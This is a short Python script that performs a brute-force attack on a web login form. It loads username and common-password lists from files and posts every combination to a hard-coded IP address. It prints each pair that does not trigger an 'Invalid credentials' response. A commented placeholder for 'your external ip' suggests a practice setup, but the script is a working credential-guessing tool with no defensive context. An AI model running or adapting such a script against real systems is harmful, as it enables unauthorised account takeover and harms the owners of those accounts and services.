import requests
import itertools

#possible usernames
unames=[uname.rstrip('\n') for uname in open('unames.txt','r')]
#most commanly used passwords
passwords=[password.rstrip('\n').strip() for password in open('passwords.txt','r')]

#url='http://<your external ip>/login'
url='http://35.247.90.41/login'


for u, p in itertools.product(unames,passwords):
    #two name attributes of input elements
    payload={'username':u,'password':p}
    post=requests.Session().post(url, data=payload)
    if 'Invalid credentials' not in  post.text:
        #print valid username and password
        print(u+' '+p)

